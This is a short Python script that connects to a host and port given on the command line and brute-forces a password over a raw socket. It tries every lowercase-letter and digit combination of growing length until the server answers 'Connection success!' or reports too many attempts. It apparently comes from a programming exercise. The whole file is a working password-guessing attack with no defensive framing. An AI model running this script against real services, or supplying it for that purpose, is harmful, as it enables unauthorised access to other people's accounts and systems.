import sys
import socket
from itertools import product
import string


CHARS = string.ascii_lowercase + string.digits

args = sys.argv
hostname = args[1]
port = int(args[2])

client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)


def find_pass():
    for i in range(1, 1000):
        for v in product(CHARS, repeat=i):
            password = "".join(v)
            data = password.encode()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == "Wrong password!":
                continue
            elif response == "Connection success!":
                return password
            elif response == "Too many attempts":
                return


result = find_pass()
client_socket.close()

if result:
    print(result)

